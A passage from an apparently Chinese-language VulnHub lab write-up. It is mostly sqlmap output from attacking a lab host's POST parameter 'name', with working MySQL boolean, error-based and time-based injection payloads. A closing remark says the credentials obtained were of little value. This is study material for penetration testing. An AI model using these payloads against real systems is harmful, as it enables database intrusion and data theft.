<span class="token punctuation">[</span>15:16:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> provided value <span class="token keyword">for</span> parameter <span class="token string">'phone'</span> is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
<span class="token punctuation">[</span>15:16:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> provided value <span class="token keyword">for</span> parameter <span class="token string">'org'</span> is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
<span class="token punctuation">[</span>15:16:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing connection to the target URL
<span class="token punctuation">[</span>15:16:58<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token keyword">if</span> the target URL content is stable
<span class="token punctuation">[</span>15:16:58<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> target URL content is stable
<span class="token punctuation">[</span>15:16:58<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token keyword">if</span> POST parameter <span class="token string">'name'</span> is dynamic
<span class="token punctuation">[</span>15:16:58<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> POST parameter <span class="token string">'name'</span> does not appear to be dynamic
<span class="token punctuation">[</span>15:16:58<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> heuristic <span class="token punctuation">(</span>basic<span class="token punctuation">)</span> <span class="token function">test</span> shows that POST parameter <span class="token string">'name'</span> might be injectable <span class="token punctuation">(</span>possible DBMS: <span class="token string">'MySQL'</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>15:16:58<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> heuristic <span class="token punctuation">(</span>XSS<span class="token punctuation">)</span> <span class="token function">test</span> shows that POST parameter <span class="token string">'name'</span> might be vulnerable to cross-site scripting <span class="token punctuation">(</span>XSS<span class="token punctuation">)</span> attacks
<span class="token punctuation">[</span>15:16:58<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token keyword">for</span> SQL injection on POST parameter <span class="token string">'name'</span>
it looks like the back-end DBMS is <span class="token string">'MySQL'</span><span class="token keyword">.</span> Do you want to skip <span class="token function">test</span> payloads specific <span class="token keyword">for</span> other DBMSes? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> 
<span class="token keyword">for</span> the remaining tests, <span class="token keyword">do</span> you want to include all tests <span class="token keyword">for</span> <span class="token string">'MySQL'</span> extending provided level <span class="token punctuation">(</span>1<span class="token punctuation">)</span> and risk <span class="token punctuation">(</span>1<span class="token punctuation">)</span> values? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> 
<span class="token punctuation">[</span>15:17:06<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'AND boolean-based blind - WHERE or HAVING clause'</span>
<span class="token punctuation">[</span>15:17:06<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> reflective value<span class="token punctuation">(</span>s<span class="token punctuation">)</span> found and filtering out
<span class="token punctuation">[</span>15:17:06<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Boolean-based blind - Parameter replace (original value)'</span>
<span class="token punctuation">[</span>15:17:06<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Generic inline queries'</span>
<span class="token punctuation">[</span>15:17:06<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'</span>
<span class="token punctuation">[</span>15:17:06<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'</span>
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'</span>
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'</span>                                                                                        
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> POST parameter <span class="token string">'name'</span> appears to be <span class="token string">'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'</span> injectable <span class="token punctuation">(</span>with --string<span class="token operator">=</span><span class="token string">"to"</span><span class="token punctuation">)</span>                            
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'</span>                                                                         
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'</span>                                                                                              
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'</span>                                                                                     
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'</span>
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'</span>                                                                             
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'</span>
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'</span>                                                                             
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'</span>
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'</span>                                                                                   
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'</span>                                                                                    
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'</span>                                                                            
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'</span>                                                                             
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'</span>                                                                               
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'</span>                                                                                
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'</span>                                                                                   
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> POST parameter <span class="token string">'name'</span> is <span class="token string">'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'</span> injectable                                                       
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL inline queries'</span>
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0.12 stacked queries (comment)'</span>
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0.12 stacked queries'</span>
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'</span>
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0.12 stacked queries (query SLEEP)'</span>
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL &lt; 5.0.12 stacked queries (BENCHMARK - comment)'</span>
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL &lt; 5.0.12 stacked queries (BENCHMARK)'</span>
<span class="token punctuation">[</span>15:17:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'</span>
<span class="token punctuation">[</span>15:17:17<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> POST parameter <span class="token string">'name'</span> appears to be <span class="token string">'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'</span> injectable                                                                           
<span class="token punctuation">[</span>15:17:17<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Generic UNION query (NULL) - 1 to 20 columns'</span>
<span class="token punctuation">[</span>15:17:17<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL UNION query (NULL) - 1 to 20 columns'</span>
<span class="token punctuation">[</span>15:17:17<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> automatically extending ranges <span class="token keyword">for</span> UNION query injection technique tests as there is at least one other <span class="token punctuation">(</span>potential<span class="token punctuation">)</span> technique found
<span class="token punctuation">[</span>15:17:17<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL UNION query (random number) - 1 to 20 columns'</span>
<span class="token punctuation">[</span>15:17:17<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL UNION query (NULL) - 21 to 40 columns'</span>
<span class="token punctuation">[</span>15:17:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL UNION query (random number) - 21 to 40 columns'</span>
<span class="token punctuation">[</span>15:17:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL UNION query (NULL) - 41 to 60 columns'</span>
<span class="token punctuation">[</span>15:17:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL UNION query (random number) - 41 to 60 columns'</span>
<span class="token punctuation">[</span>15:17:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL UNION query (NULL) - 61 to 80 columns'</span>
<span class="token punctuation">[</span>15:17:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL UNION query (random number) - 61 to 80 columns'</span>
<span class="token punctuation">[</span>15:17:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL UNION query (NULL) - 81 to 100 columns'</span>
<span class="token punctuation">[</span>15:17:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL UNION query (random number) - 81 to 100 columns'</span>
POST parameter <span class="token string">'name'</span> is vulnerable. Do you want to keep testing the others <span class="token punctuation">(</span>if any<span class="token punctuation">)</span>? <span class="token punctuation">[</span>y/N<span class="token punctuation">]</span> 
sqlmap identified the following injection point<span class="token punctuation">(</span>s<span class="token punctuation">)</span> with a total of 396 HTTP<span class="token punctuation">(</span>s<span class="token punctuation">)</span> requests:
---
Parameter: name <span class="token punctuation">(</span>POST<span class="token punctuation">)</span>
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: name<span class="token operator">=</span>1<span class="token string">' RLIKE (SELECT (CASE WHEN (3453=3453) THEN 1 ELSE 0x28 END))-- fkrZ&amp;email=&amp;phone=&amp;org=

    Type: error-based
    Title: MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: name=1'</span> AND ROW<span class="token punctuation">(</span>9202,7421<span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">(</span>SELECT COUNT<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,CONCAT<span class="token punctuation">(</span>0x716b766271,<span class="token punctuation">(</span>SELECT <span class="token punctuation">(</span>ELT<span class="token punctuation">(</span>9202<span class="token operator">=</span>9202,1<span class="token punctuation">))</span><span class="token punctuation">)</span>,0x7171627a71,FLOOR<span class="token punctuation">(</span>RAND<span class="token punctuation">(</span>0<span class="token punctuation">)</span>*2<span class="token punctuation">))</span>x FROM <span class="token punctuation">(</span>SELECT 5809 UNION SELECT 6254 UNION SELECT 2907 UNION SELECT 3295<span class="token punctuation">)</span>a GROUP BY x<span class="token punctuation">)</span>-- lorR<span class="token operator">&amp;</span>email<span class="token operator">=</span><span class="token operator">&amp;</span>phone<span class="token operator">=</span><span class="token operator">&amp;</span>org<span class="token operator">=</span>

    Type: time-based blind
    Title: MySQL <span class="token operator">>=</span> 5.0.12 AND time-based blind <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span>
    Payload: name<span class="token operator">=</span>1<span class="token string">' AND (SELECT 6598 FROM (SELECT(SLEEP(5)))WnCm)-- cXmx&amp;email=&amp;phone=&amp;org=
---
[15:17:23] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Fedora 6 or 8 or 7 (Moonshine or Zod or Werewolf)
web application technology: Apache 2.2.6, PHP 5.2.4
back-end DBMS: MySQL >= 4.1
[15:17:23] [INFO] fetched data logged to text files under '</span>/root/.local/share/sqlmap/output/192.168.56.139'                                                                                     

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ 15:17:23 /2023-04-27/
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可惜获得的凭证只能用于登录blog页面，并不能登录后台以及ssh连接，价值不大。<br class='item-img' data-src='/pic/assets/1682582208788-d567501b-7d14-4c47-867b-cf9543c88a28.png'><img src="/pic/assets/1682582208788-d567501b-7d14-4c47-867b-cf9543c88a28.png" alt="uTools_1682580664805.png"></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/05/24/LampSecurity-CTF6_my/">← Next [vulnhub]  LampSec-CTF6</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/05/24/jarbas/">[vulnhub]  jarbas Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Info-Gather"><span class="toc-number">1.</span> <span class="toc-text">Info Gather</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">1.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">1.2.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RFI%EF%BC%88F%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">RFI（F）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQLi%EF%BC%88F%EF%BC%89"><span class="toc-number">1.2.2.</span> <span class="toc-text">SQLi（F）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LFI%EF%BC%88F%EF%BC%89"><span class="toc-number">1.2.3.</span> <span class="toc-text">LFI（F）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Samba%EF%BC%88F%EF%BC%89"><span class="toc-number">1.2.4.</span> <span class="toc-text">Samba（F）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NanoCMS%EF%BC%88S%EF%BC%89"><span class="toc-number">1.2.5.</span> <span class="toc-text">NanoCMS（S）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Priv-E"><span class="toc-number">2.</span> <span class="toc-text">Priv E</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">2.1.</span> <span class="toc-text">补充</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>